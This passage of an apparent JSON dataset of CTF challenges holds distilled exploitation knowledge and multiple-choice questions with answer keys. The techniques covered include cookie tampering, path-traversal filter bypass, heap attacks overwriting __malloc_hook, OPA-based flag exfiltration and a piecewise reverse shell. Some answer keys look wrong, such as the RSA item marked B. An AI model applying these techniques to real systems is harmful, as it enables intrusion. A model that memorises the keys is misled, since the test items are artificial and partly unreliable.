            "After determining the prime factors \\(p\\) and \\(q\\) of the modulus \\(n\\) in an RSA encryption system, which step is correctly shown in Python code to decrypt a cipher \\(m\\) given the public exponent \\(e\\) and the cipher text itself?  - A. ```python phi = (p - 1) * (q - 1) d = (e - 1) % phi plaintext = pow(cipher, d, n) print(long_to_bytes(plaintext).decode()) ```  - B. ```python phi = (p - 1) * (q + 1) d = inverse(e, phi) plaintext = pow(m, d, n) print(long_to_bytes(plaintext).decode()) ```  - C. ```python phi = (p - 1) * (q - 1) d = inverse(e, phi) plaintext = pow(cipher, d, n) print(long_to_bytes(plaintext).decode()) ```  - D. ```python phi = p * q d = inverse(e - 1, phi) plaintext = pow(cipher, d, phi) print(long_to_bytes(plaintext).decode()) ``` "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "One-for-all",
        "write_up": "dataset/raw/One-for-all.md",
        "type": "web",
        "competition": [
            "PatriotCTF/2023",
            "https://ctftime.org/event/2030/tasks/"
        ],
        "score": 488,
        "max_score": 495,
        "difficulty": 0.9858585858585859,
        "knowledge": [
            "When encountering a website with user-specific functionalities, manipulation of cookie values can reveal hidden information or grant unauthorized access to restricted functionalities. In scenarios where a default or identifiable cookie name is present, altering its value to commonly privileged usernames such as 'admin' can unlock parts of or entire flags in CTF challenges. \n   - Example payload: Changing default cookie value from 'kiran' to 'admin'.",
            "In challenges involving websites with path traversal vulnerabilities, using unusual characters like semicolons (';') to bypass filters or restrictions can lead to the discovery of hidden directories, files, or pieces of flags. This method is particularly effective when standard directory traversal payloads (e.g., '../') are filtered or blocked.\n   - Example payload: Accessing hidden paths by appending ';/' to bypass filters, as in the URL `http://domain.com/path/..;/`."
        ],
        "question": [
            "In a scenario where the website issues a default cookie 'kiran' upon user login, and the objective is to escalate privileges or access restricted functionalities, what technique could potentially unlock hidden parts of a website? - A. Increase the value of the cookie's Max-Age attribute - B. Alter the cookie value to 'admin' - C. Encrypt the cookie value using SHA-256 - D. Send the cookie value in a different header ",
            "Given a web application suspected of having path traversal vulnerabilities, which approach might successfully reveal hidden directories or files when common payloads such as '../' are ineffective due to filters? - A. Prepending payloads with hash symbols ('#') - B. Encoding the traversal sequence in Base64 - C. Appending ';/' to paths - D. Including full URLs in the traversal payloads "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "onetestament",
        "write_up": "dataset/raw/onetestament.md",
        "type": "pwn",
        "competition": [
            "insomnihack/2022/Quals",
            "https://ctftime.org/event/1505/tasks/"
        ],
        "score": 290,
        "max_score": 451,
        "difficulty": 0.6430155210643016,
        "knowledge": [
            "When exploiting heap vulnerabilities, especially in scenarios involving `calloc` allocations, an off-by-one error can be used to bypass the zeroing effect of `calloc` by setting the `IS_MMAPED` flag on a chunk. This is achieved by incrementing the size field of a free chunk, which can lead to information leakage if `calloc` does not zero out the chunk's data upon allocation due to the presence of the `IS_MMAPED` flag. This technique is invaluable when there's a need to leak addresses in challenges constrained by `calloc` usage for allocations. \n   - Example scenario: Using an off-by-one vulnerability to edit a chunk size field to set the `IS_MMAPED` flag for leaking libc addresses.",
            "Fastbin duplication attacks can be leveraged to execute arbitrary code when exploiting double-free vulnerabilities. By carefully managing the heap and using off-by-one bugs to manipulate the heap's metadata (such as bypassing double-free protections), attackers can insert an arbitrary address into the fastbin freelist. This approach allows for control over future allocations and enables overwriting sensitive locations like `__malloc_hook` with a one-gadget to gain execution control. It's crucial to ensure that size fields match and to calculate offsets meticulously to place and use fake chunks effectively.\n   - Example scenario: Creating a fake chunk near `__malloc_hook` and overwriting it with a one-gadget address to execute arbitrary code.\n   - Example payload for overwriting `__malloc_hook`: `create(3, p8(0) * 0x13 + p64(libc.address + one_gadget_address))`"
        ],
        "question": [
            "When exploiting a heap vulnerability with `calloc`, how can an attacker bypass the zeroing effect of `calloc` using an off-by-one error? - A. By decrementing a free chunk's size field to disable the `IS_MMAPED` flag. - B. By using a fastbin duplication attack to corrupt the `calloc` metadata. - C. By incrementing a free chunk's size field to set the `IS_MMAPED` flag, preventing data zeroing. - D. By overflowing the `calloc` buffer to overwrite adjacent chunk flags without setting `IS_MMAPED`.",
            "In the context of a fastbin duplication attack based on an off-by-one vulnerability that allows bypassing double-free protections, what is the final step to achieve arbitrary code execution? - A. Freeing the same chunk three times to corrupt the fastbin's freelist. - B. Inserting a non-allocated chunk into the fastbins list for corruption. - C. Overwriting `__malloc_hook` with the address of `exit` to safely terminate the process. - D. Creating a fake chunk near `__malloc_hook` and overwriting it with a one-gadget address to execute arbitrary code."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "online nonogram",
        "write_up": "dataset/raw/online nonogram.md",
        "type": "reverse",
        "competition": [
            "TokyoWesterns/2020",
            "https://ctftime.org/event/1086/tasks/"
        ],
        "score": 252,
        "max_score": 478,
        "difficulty": 0.5271966527196653,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities in a binary that doesn't strictly verify the size of user input against the buffer's capacity, one can corrupt nearby memory structures. This approach is effective in scenarios where adjacent memory structures contain vital program or data pointers that can be manipulated for further exploitation. To leverage this, carefully craft the input payload so that it overflows the buffer and modifies the adjacent memory data in a manner that benefits the exploitation process.",
            "Understanding and manipulating the structure of heap memory, especially using the characteristics of C++ vectors, can be utilized for leaking memory addresses and subsequently for arbitrary memory write operations. This technique is particularly useful in scenarios involving a heap overflow or an out-of-bounds write where the program's logic allows manipulation of heap-allocated data structures like C++ vectors. For leaking addresses, create conditions where uninitialized or improperly managed memory reveals pointers or heap structure data. For arbitrary writes, corrupt data structure pointers (such as the `next` pointers in a tcache list) to redirect application execution to controlled data or execute arbitrary code.\n   - For leaking (simplified): `add_puzzle(\"A\"*256)` to overflow and leak data.\n   - For arbitrary write using tcache corruption: First free some chunks to populate the tcache. Then, manipulate a future allocation into the tcache linked list to point to the target address. Prepare the content to overwrite the target in subsequent allocations: `add_puzzle(\"name\", size, \"A\"*8)` where `\"A\"*8` is replaced with the address or command to write into the previously targeted location."
        ],
        "question": [
            "When developing a puzzle game binary that includes a function for adding puzzles without adequate input size validation, which of the following outcomes is a potential security risk if user inputs are not properly limited to the size of the designated buffer? - A. Increased performance due to efficient memory usage. - B. Reduced risk of memory leaks as all inputs are accepted. - C. Possibility of corrupting adjacent memory structures due to buffer overflow, leading to a security vulnerability. - D. Enhanced user experience due to the flexibility of data input. ",
            "In a scenario where a C++ binary manages puzzles using a vector and suffers from a heap overflow vulnerability, which technique is most effective for executing an arbitrary write after manipulating the heap structure through corrupted data pointers in a tcache list? - A. Resetting all pointers in the program to null to prevent unauthorized access. - B. Filling the heap with large amounts of data to trigger an automatic cleanup by the garbage collector. - C. Utilizing the overflow to corrupt vector pointers, then leveraging tcache list manipulation to achieve arbitrary memory write capabilities, such as overwriting function pointers or the `__free_hook`. - D. Encrypting the heap memory to secure data against unauthorized modifications. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Opa Opa Opa Opa Hei",
        "write_up": "dataset/raw/Opa Opa Opa Opa Hei.md",
        "type": "This write-up describes a CTF challenge which falls under the category of \"forensics\". The challenge involves investigating and analyzing various components such as docker-compose services, source code, Open Policy Agent (OPA), and environment variables to uncover the hidden flag. The solution involves understanding and manipulating policies in OPA, utilizing functions like startsWith and substring, and crafting a script to systematically reveal each character of the flag. The challenge requires a forensic approach to piece together clues and decode the flag character by character.",
        "competition": [
            "BSidesTLV/2023",
            "https://ctftime.org/event/2008/tasks/"
        ],
        "score": 400,
        "max_score": 500,
        "difficulty": 0.8,
        "knowledge": [
            "Accessing environment variables in a security policy can be performed using built-in functions or methods specific to the policy language being used. This approach can be utilized in scenarios where sensitive information is passed or stored in environment variables of services such as OPA (Open Policy Agent). An effective strategy includes crafting policies that can evaluate to true based on the content of an environment variable, allowing for indirect data exfiltration. Sample policy for testing whether a string starts with a specific prefix:\n```\n{\n\t\"policy\": \"allow{startswith(opa.runtime().env[\\\"FLAG\\\"],\\\"BSidesTLV2023{\\\")==true}\"\n}\n```",
            "When dealing with restricted character sets in inputs, methods like substring comparison can be applied as a bypass technique to infer or leak information character by character. This is particularly useful in environments where direct access to certain characters might be restricted by input validation or filtering mechanisms, such as regular expressions limiting allowed characters. In CTF challenges, crafting input to policies or queries with functions like substring allows an attacker to iteratively determine the value of restricted or unknown data. Evaluating a policy with custom inputs to perform character-by-character flag extraction:\n```\n{\n   \"uuid\": \"uuid_here\",\n   \"input\": \"{\\\"input\\\":{\\\"index\\\":0, \\\"cand\\\":\\\"B\\\"}}\"\n}\n```\nThis approach involves supplying a character and its index as parameters to evaluate if the character at the given index matches, allowing for a flag or other secret values to be discovered incrementally."
        ],
        "question": [
            "In the context of using Open Policy Agent (OPA) to access environment variables which contain sensitive information, such as flags in a CTF challenge, which of the following policies correctly demonstrates how to check if a given environment variable value starts with a specified prefix? - A. `{\"policy\": \"allow{opa.runtime().env[\\\"FLAG\\\"]==\\\"BSidesTLV2023{\\\"}\"}` - B. `{\"policy\": \"allow{opa.env[\\\"FLAG\\\"].startsWith(\\\"BSidesTLV2023{\\\")}\"}` - C. `{\"policy\": \"allow{startswith(opa.runtime().env[\\\"FLAG\\\"],\\\"BSidesTLV2023{\\\")==true}\"}` - D. `{\"policy\": \"allow{opa.runtime().getEnvVar(\\\"FLAG\\\").eq(\\\"BSidesTLV2023{\\\")}\"}`",
            "When using functions like substring to get around restrictions on certain characters in a CTF challenge, which of the following illustrates the correct way to create a policy for evaluating if a character at a specified index of a flag matches a provided character, taking into account restricted character input rules? - A. `{\"policy\": \"allow{opa.runtime().env[\\\"FLAG\\\"][input.index]==input.cand}\"}` - B. `{\"policy\": \"allow{substring(opa.runtime().env[\\\"FLAG\\\"],input.index,1)==input.cand}\"}` - C. `{\"policy\": \"a{regexp.match(opa.runtime().env[\\\"FLAG\\\"], input.index, input.cand)}\"}` - D. `{\"policy\": \"allow{opa.runtime().env[\\\"FLAG\\\"].substring(input.index,1).equals(input.cand)}\"}`"
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "opisthocomus-hoazin",
        "write_up": "dataset/raw/opisthocomus-hoazin.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 300,
        "max_score": 493,
        "difficulty": 0.6085192697768763,
        "knowledge": [
            "When encountering cryptography CTF challenges that involve simple obfuscation or encryption methods, a practical approach is to perform known plaintext attacks. For such challenges, if the beginning of the plaintext (like \"flag{\") is known, and its corresponding encrypted output is given, one can derive a key or decryption method. Specifically, if an encryption algorithm uses the entirety of the ASCII character set and applies a consistent operation across all characters (e.g., XOR with a fixed key and mod operation with a large number `n`), it's feasible to reverse-engineer this process by creating a lookup table or `key` mapping each character to its encrypted counterpart.",
            "In cryptography or reverse-engineering challenges, when the encrypted data is significantly large, automation through scripting can simplify the decryption process. By writing a script that reads the encrypted values from a file and then decodes the flag using a previously constructed lookup table, a tedious manual process is efficiently streamlined. The script should ideally index the encrypted values against their plaintext counterparts, allowing for quick retrieval and decryption of extensive ciphertexts without manual effort. This method relies on the assumption that a direct mapping exists and can be exploited, as demonstrated in the provided Python code snippet where each encrypted character is matched against its plaintext representation through indexing in arrays or lists."
        ],
        "question": [
            "When attempting to decrypt a given piece of encrypted text using a lookup table method, which element is crucial for accurately deriving the plaintext from the ciphertext? - A. The length of the encryption key used - B. A known piece of plaintext and its corresponding encrypted output - C. The specific programming language used for scripting - D. The complexity of the encryption algorithm ",
            "In a scenario where a script is implemented to automate the decryption of ciphertext stored in a file, utilizing a lookup table constructed from known plaintext-encrypted pairs, what aspect of the script is essential for efficiently mapping each encrypted character back to its plaintext form? - A. The ability of the script to generate prime numbers - B. The script's interaction with an external database for storing the lookup table - C. The organization of plaintext and ciphertext into indexed arrays or lists for quick retrieval - D. The encryption algorithm's resistance to quantum computation attacks "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Ordersystem",
        "write_up": "dataset/raw/Ordersystem.md",
        "type": "reverse",
        "competition": [
            "Hack.lu/2022",
            "https://ctftime.org/event/1727/tasks/"
        ],
        "score": 343,
        "max_score": 500,
        "difficulty": 0.686,
        "knowledge": [
            "When faced with restrictions on directly executing or uploading code due to encoding constraints, consider using a subset of instructions or data that are permissible within the constraints to indirectly achieve the desired outcome. Example scenario: needing to execute code in an environment where data is hex-encoded before execution, thus limiting the available instructions to those that can be represented by printable hex characters. Use instructions that are representable in hex and can indirectly call or execute the desired function.\n   - No specific payload example applicable as this is a strategy reliant on the context-specific opcode and hex character availability.",
            "For bypassing input filtering or restrictions that limit direct file or command execution, creatively utilize application-provided functions or methods in unintended ways to chain together actions that lead to arbitrary code execution. This may involve crafting payloads that when executed piece by piece, accomplish the goal of spawning a reverse shell or similar. In scenarios where direct execution paths are filtered or blocked, use application features (e.g., logging, storing, or plugin execution functions) to indirectly assemble and execute malicious payloads.\n   - Example payload strategy: Break down the malicious code into acceptable pieces, store each piece using the application's storage functionality, and use a feature like plugin execution to read, assemble, and execute these pieces indirectly."
        ],
        "question": [
            "When attempting to execute bytecode in a restricted environment where data is encoded to hexadecimal before being processed, rendering traditional bytecode useless due to transformation, which of the following Python opcodes could theoretically be executed directly without being altered by hexadecimal encoding?  - A. `INPLACE_MODULO` - B. `LOAD_CONST` - C. `YIELD_FROM` - D. `LOAD_FAST` ",
            "In a system where direct code execution is restricted and specific functions like log writing are available, how can you leverage these functions to execute a reverse shell if direct execution paths like command injection are filtered? Assume you have the capability to chunk and store data within the system and can trigger a function that writes to a log file.  - A. Directly upload a reverse shell script as a log event. - B. Use the log function to gradually build an executable script by providing it parts of the reverse shell code as log messages. - C. Attempt to overload the log function buffer to force execution of unintended functions. - D. Encrypt the reverse shell code and use the log function to decrypt and execute it. "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "OSDev",
        "write_up": "dataset/raw/OSDev.md",
        "type": "crypto",
        "competition": [
            "KipodAfterFree/2020",
            "https://ctftime.org/event/1133/tasks/"
        ],
        "score": 490,
        "max_score": 500,
        "difficulty": 0.98,
        "knowledge": [
            "When analyzing binary files with potential custom encryption mechanisms, use virtualization software (e.g., QEMU) to execute the binary if it's designed to run on a specific hardware or software architecture. This allows for dynamic analysis and understanding of the binary's behavior in its intended environment.",
            "Custom encryption algorithms, especially those that resemble known algorithms with slight modifications, can be reversed by carefully analyzing and understanding the modifications made to the standard algorithm. In the case of a modified AES encryption:\n    - Identify the functions that deviate from the standard AES, focusing on substitution boxes (S-boxes) or mix columns transformations.\n    - Implement inverse functions for these custom operations to reverse the encryption process.\n    - Apply the reverse operations in the correct order, accounting for any custom key schedule or XOR operations used in the encryption process.\n\nExample code snippet to reverse a custom AES encryption:\n```python\n# Custom inverse ShiftRows operation\ndef ishiftRows(input):  \n   iSR = [0,13,10,7,4,1,14,11,8,5,2,15,12,9,6,3]  \n   return [input[iSR[i]] for i in range(16)]\n\n# Example usage of reversing custom AES operations\np = [ciphertext_byte ^ TXOR[160+i] for i in range(16)]  # Reverse initial round XOR\nfor rnd in reversed(range(10)):  \n   if rnd != 9:  \n       p = imixColumns(p)  # Custom inverse MixColumns if not last round\n   p = ishiftRows(p)  # Custom inverse ShiftRows\n   p = ifuckBytes(p)  # Custom inverse ByteSub operation\n   for i in range(16):  \n       p[i] ^= TXOR[16*rnd+i]  # Reverse round XOR with custom key schedule\nprint(\"Decrypted plaintext:\", \"\".join([chr(x) for x in p]))\n```"
        ],
        "question": [
            "In a scenario where a cryptographer is facing a custom encryption mechanism that runs on a specific hardware architecture not readily available, which tool is most recommended for executing and dynamically analyzing the binary to understand its behavior? - A. Use a decompiler such as Ghidra to statically analyze the binary. - B. Employ QEMU for virtualization to execute the binary as if it were running on the intended hardware. - C. Utilize an online sandbox service for executing and testing the binary in a cloud environment. - D. Apply a standard debugger such as GDB to step through the encryption process without emulation. ",
            "Given a modified AES encryption scheme where the standard byte substitution step is replaced with a custom function and an inverse operation is needed to decrypt the ciphertext, what is the correct order of operations during the decryption process? - A. Start with the inverse MixColumns, proceed to the inverse ShiftRows, and finish with reversing the initial round XOR operation. - B. Apply the inverse ByteSub operation, continue with the inverse ShiftRows, and conclude with the modified MixColumns if not the last round. - C. Begin with reversing the initial round XOR, perform the inverse MixColumns if not the last round, follow with the inverse ShiftRows, and end with the custom inverse ByteSub operation. - D. Initiate decryption with the inverse MixColumns for all rounds, apply the custom inverse ByteSub operation, and end with the inverse ShiftRows operation. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "OSINT The Creator",
        "write_up": "dataset/raw/OSINT The Creator.md",
        "type": "This write-up describes an OSINT (Open Source Intelligence) challenge where the participants have to do research to find the flag on a Discord profile. Therefore, the type of this CTF challenge is **OSINT**.",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When solving OSINT challenges related to identifying individuals within a specific platform (like Discord), first directly search for the target's name (if provided) among the community members or administrators. If this direct approach does not yield results or the target might use a different username, use platform-specific search functions or explore related social networks to find similarities in nicknames or profiles.",
            "In scenarios where the target is found but the information is not immediately visible, inspect all accessible elements of their profile. This includes status messages, profile descriptions, and any multimedia content (such as images or spoilers) that might hide the flag or clues leading to it."
        ],
        "question": [
            "When conducting an OSINT investigation to locate an individual's profile on a platform like Discord, how should one initially proceed if the person's real name is known? - A. Guess the password of the person's account to gain direct access. - B. Directly search for the person's real name among the community members or administrators. - C. Delete your account and create a new one with the target's name to see if they respond. - D. Hack into the server's database to search for the user's details.",
            "In a situation where you've located the suspect's profile on a platform during an OSINT challenge, but the needed information appears hidden or not directly visible, what should your next step involve? - A. Request the platform's admin to provide the information. - B. Ignore the profile and look for a different individual with the same name. - C. Inspect all accessible profile elements, such as status messages, descriptions, and multimedia content for potential clues. - D. Create a fake profile to catfish the individual into revealing the information."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "OSRS",
        "write_up": "dataset/raw/OSRS.md",
        "type": "pwn",
        "competition": [
            "TJCTF/2020",
            "https://ctftime.org/event/928/tasks/"
        ],
        "score": 50,
        "max_score": 100,
        "difficulty": 0.5,
        "knowledge": [
            "When facing a binary exploitation challenge with a buffer overflow vulnerability due to the use of `gets()`, it is crucial to determine the offset between the start of the buffer and the return address. This knowledge enables the construction of a payload that overwrites the return address with a desired value, such as the address of a function or a buffer. In scenarios where security mechanisms like PIE (Position Independent Executable) or NX (No eXecute bit) are not enabled, but ASLR (Address Space Layout Randomization) is enabled, a leak can be exploited to determine the base address of the buffer or function, facilitating the crafting of an effective exploit. Sample payload structure: `[shellcode][padding][pointer to shellcode or desired function]`",
            "If a program leaks an address as part of its output, this can be exploited under ASLR to calculate the base address of the buffer or a particular function within the process's memory space. This technique is especially valuable when the leaked address can be directly attributed to a buffer where arbitrary input is stored or a stack address, as it allows for precisely targeting the memory address with a shellcode or return-oriented programming (ROP) chain despite ASLR. This knowledge is applicable in crafting a two-stage exploit where the first stage involves triggering the address leak and parsing it to calculate the target address, followed by executing the main payload that leverages the calculated address for code execution or memory manipulation."
        ],
        "question": [
            "When exploiting a buffer overflow vulnerability in a binary without PIE or NX but with ASLR enabled, what is the main purpose of determining the offset between the buffer's start and the return address? - A. To corrupt the binary's GOT table to hijack control flow - B. To allocate space for the environment variables on the stack - C. To overwrite the return address with the address of a function or buffer containing shellcode - D. To enable the stack canaries for protecting the return address",
            "How can a leaked buffer address be utilized in a binary exploitation challenge involving ASLR? - A. By recalculating the base address of the heap to launch a heap spraying attack - B. By determining the base address of the buffer or a function to precisely target the memory address with a shellcode or ROP chain - C. To brute-force the ASLR by generating all possible addresses - D. By modifying the binary's .text section at runtime to bypass ASLR"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "OTP1",
        "write_up": "dataset/raw/OTP1.md",
        "type": "crypto",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 284,
        "max_score": 500,
        "difficulty": 0.568,
        "knowledge": [
            "When attacking XOR cipher challenges where the flag is used as a repeated key, tools like xortool can be invaluable for determining the key length. This is especially beneficial for ciphers with longer key sizes, as knowing the length can significantly reduce the complexity of breaking the cipher. A common strategy involves analyzing the ciphertext with xortool to identify probable key lengths, focusing on the highest percentages provided by the tool.",
            "In situations where the key length is known or guessed (such as when xortool indicates a probable length), using xortool with the `-l` option to specify the key length and `-c` to provide a guess for the most common character in the plaintext can reveal possible keys or parts of the plaintext. This method relies on statistical analysis and the frequency of characters in the expected plaintext, which, in CTF challenges, often involves known plaintext attacks where the format of the flag is predictable."
        ],
        "question": [
            "In the context of deciphering XOR ciphers, particularly when the flag itself is used as a repeating key, which of the following commands correctly reflects the process of using xortool to gauge the most probable key lengths from a given ciphertext file named \"encrypted.dat\"?  - A. $ xortool -p encrypted.dat - B. $ xortool encrypted.dat - C. $ xortool --decrypt encrypted.dat - D. $ python xortool.py -f encrypted.dat ",
            "Given a scenario where the length of a key for an XOR cipher has been identified as 25 using xortool, and 'E' is believed to be the most frequent character in the plaintext, which command best represents the approach to uncover possible keys using xortool?  - A. $ xortool -l 25 -c E encrypted.dat - B. $ xortool --key-length=25 --char=E encrypted.dat - C. $ xortool -k 25 -f E encrypted.dat - D. $ xortool --length 25 --common E encrypted.dat "
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "OTP2",
        "write_up": "dataset/raw/OTP2.md",
        "type": "crypto",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 422,
        "max_score": 500,
        "difficulty": 0.844,
        "knowledge": [
            "When dealing with encryption challenges where the flag is XORed and padded to a fixed length with random characters, one effective method to start decrypting is to focus on the known part of the plaintext. In this case, knowing the flag format (e.g., \"UDCTF{\") and that the plaintext consists of only uppercase characters provides a way to iteratively decrypt the ciphertext by aligning the known plaintext at different positions until decrypted content fits the expected pattern. This method relies on the fact that the ciphertext was produced by XORing the plaintext with a repeating key. Therefore, identifying the position where the known plaintext aligns correctly can lead to the recovery of parts of the plaintext.",
            "Once the position of the known plaintext within the ciphertext is identified, the next step to decrypting the flag is to sequentially guess the next character of the plaintext by XORing each possible character with the corresponding byte in the ciphertext. This brute-force approach is viable due to the limited character set (e.g., uppercase ASCII letters) and the predictable structure of the flag. By observing which results in valid plaintext (e.g., staying within the expected character set), one can iteratively decrypt the entire ciphertext. This method serves to crack XOR encryption when the key is repeated, and parts of the plaintext are known or can be guessed with high confidence.\n\nExample payload step for guessing the next character:\n```python\ndef possible_chars(key, kpos):\n   ch = ct[0][kpos]\n   res = []\n   for c in ascii_uppercase:\n       res.append(ch ^ ord(c))\n   return res\n\ndef find_nextchar(key, kpos):\n   pchars = possible_chars(key, kpos + len(key))\n   for c in pchars:\n       res = [try_kpos(x, kpos, key + bytes([c])) for x in ct]\n       if res[0][0] and res[1][0]:\n           print(chr(c), res[0][1], res[1][1])\n```\nThis snippet illustrates how to proceed once the alignment is found, by trying all uppercase ASCII characters for the next position, checking which ones result in valid plaintext according to the problem constraints (e.g., all-uppercase flags)."
        ],
        "question": [
            "In a cryptography challenge that involves a ciphertext generated by XORing a plaintext with a repeating key, when parts of the plaintext are known or predictable, such as a flag format or character set, how should one approach the decryption process to find the correct alignment of the known plaintext within the ciphertext?  - A. Randomly guess the key until the plaintext makes sense. - B. Use the known part of the plaintext to align it at different positions against the ciphertext and check for valid decrypted content. - C. Reverse-engineer the encryption algorithm to directly calculate the key. - D. Encrypt random plaintext with different keys until one matches the ciphertext. ",
            "After identifying the position of the known plaintext within a ciphertext that was XOR encrypted with a repeating key, what is the next step to decipher the subsequent characters of the flag, given that the plaintext consists of a predictable character set?  - A. Calculate the hash of the ciphertext to find patterns. - B. XOR the entire ciphertext with the known key to reveal the plaintext. - C. Brute-force each possible next character by XORing it with the corresponding ciphertext position and check if the result follows the plaintext's character set constraints. - D. Increase the length of the key by random characters and attempt to decrypt the ciphertext. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "OTP3",
        "write_up": "dataset/raw/OTP3.md",
        "type": "crypto",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "When dealing with an encryption scenario where a key is used to encrypt multiple plaintexts (i.e., a two-time pad situation), recovering the plaintext can be possible by finding the position at which plaintexts are padded and iterating through possible key lengths. This approach becomes feasible if the encryption mechanism pads the plaintext to a variable but known range of lengths before encryption. One can iterate through the range of possible key lengths to find consistent patterns or information, such as the position of the flag or known plaintext components.",
            "In a situation where you know the position of encrypted data (such as a flag) within a larger encrypted dataset and you have clues about the encryption methodology (e.g., the use of a two-time pad where the same key encrypts multiple plaintexts), a structured approach to sequentially recover each character of the encrypted data can be applied. This involves iteratively guessing the next character by considering all possible characters, decrypting them with all possible key parts, and then checking for consistency or recognizable patterns in the decrypted output. This method requires trial and error but can systematically uncover the correct sequence of characters constituting the hidden information or flag.\n   \nExample Python snippet for finding the next character in an encrypted message:\n```python\nklen = 549  # Assumed key length from analysis\nkpos = 245  # Known position of the start of the flag\n\ndef find_nextchar(key, kpos, klen):\n    # Assuming 'key' is the observed keystream or derived from ciphertexts,\n    # and 'cipher_text' is one of the ciphertexts.\n    # This function would attempt to decrypt part of the ciphertext\n    # with each possible byte value (0-255) to find a byte that\n    # results in a printable character or matches expected pattern.\n    for byte in range(256):\n        potential_char = decrypt_byte(cipher_text[kpos], key, byte)\n        if is_printable(potential_char):\n            print(f\"Potential character: {potential_char}\")\n```\n(Note: The actual decryption mechanism `decrypt_byte()` and check `is_printable()` would need to be defined based on the encryption scheme and context.)"
        ],
        "question": [
            "In a given encryption scenario where a fixed key is used to encrypt multiple plaintexts leading to a situation akin to a \"two-time pad,\" what is the most effective strategy for beginning to crack the encryption? - A. Attempt to reverse-engineer the encryption algorithm directly without considering the structure of the plaintext. - B. Launch a brute force attack on the encrypted data, trying every possible key until the plaintext is revealed. - C. Identify the range of possible lengths to which plaintext is padded before encryption, and iterate over this range to find consistent patterns or information that could reveal the position of known plaintext components. - D. Focus solely on analyzing the ciphertext to find repetition patterns that could indicate the encryption key without considering the length of the padding.",
            "When trying to decrypt data (e.g., a flag) hidden within a larger dataset encrypted with a method resembling a two-time pad, what is an effective approach for recovering each character of the encrypted data? - A. Use the known position of the start of the encrypted data to apply a random guess and check approach for each character. - B. Given the position of the encrypted data and the length of the key, systematically attempt to decrypt each character by trying all possible characters against all potential key parts, then check for recognizability or consistency in outputs. - C. Apply a dictionary attack by comparing the encrypted data against a pre-built list of common passwords and flags. - D. Ignore the known positions and key length, focusing instead on trying to find a universal key that decrypts the entire dataset at once."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "OTS",
        "write_up": "dataset/raw/OTS.md",
        "type": "crypto",
        "competition": [
            "SpamAndFlags/2020/Quals",
            "https://ctftime.org/event/970/tasks/"
        ],
        "score": 105,
        "max_score": 500,
        "difficulty": 0.21,
        "knowledge": [
            "When dealing with cryptographic algorithms that allow manipulation of message content and its signature via hash functions, one can exploit the algorithm's logic by substituting bytes in the message and correspondingly adjusting the signature blocks using the hash function. In scenarios where signatures are calculated by applying a hash function a certain number of times based on the message content, changing a message byte from one value to another (specifically, to a lower value in terms of byte order) and then applying the hash function an appropriate number of additional times on the affected signature block, can maintain signature validity. This approach works under the condition that the cryptographic verification process hashes the adjusted signature block the correct total number of times to match the public key.",
            "When amending a message and its signature to include a specific word or set of bytes (e.g., \"flag\"), while ensuring the overall checksum of the message changes in a controlled manner, one can utilize a brute-force approach to modify unrelated parts of the message to decrease byte values until the new checksum has each byte smaller than the original checksum. This tactic relies on the flexibility to make arbitrary byte substitutions in parts of the message not critical to the desired outcome (like adding the word \"flag\"), followed by a systematic trial and error process to achieve an acceptable checksum that fits the required criteria and allows for corresponding adjustments to the signature. \n\nExample payload generation strategies include:\n- For substituting bytes and adjusting signature blocks: Calculate the difference in byte values between the original and desired message characters, then apply the hash function this many times to the corresponding signature block.\n- For modifying parts of the message to fit checksum constraints: Randomly decrease byte values in non-critical parts of the message, recalculate the checksum after each modification, and compare with the original checksum to ensure each byte of the new checksum is smaller, applying hash functions as needed to adjust the signature."
        ],
        "question": [
            "In a scenario where a cryptographic verification process involves hashing a message's signature blocks based on the message content, which technique allows for maintaining signature validity when changing a message byte to a lower value? - A. Increasing the byte value in the message and reducing the number of hash functions applied to the signature. - B. Changing a message byte to a higher value and applying the hash function additional times to the signature block. - C. Keeping the message byte as is and applying the hash function fewer times to the signature block. - D. Changing a message byte to a lower value and applying the hash function additional times to the affected signature block.",
            "When amending a message to include a specific word and ensuring the checksum changes in a manner that allows the signature to remain valid, which approach can be used to achieve an acceptable checksum? - A. Randomly increasing byte values in parts of the message and comparing the new checksum with the original. - B. Systematically increasing and decreasing byte values in critical parts of the message until the new checksum is larger than the original. - C. Randomly decreasing byte values in non-critical parts of the message, recalculating, and comparing the checksum until each byte is smaller than the original. - D. Keeping all byte values constant in the message and only altering the checksum directly through hash functions."
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Our First API",
        "write_up": "dataset/raw/Our First API.md",
        "type": "crypto",
        "competition": [
            "RITSEC/2019",
            "https://ctftime.org/event/898/tasks/"
        ],
        "score": 417,
        "max_score": 625,
        "difficulty": 0.6672,
        "knowledge": [
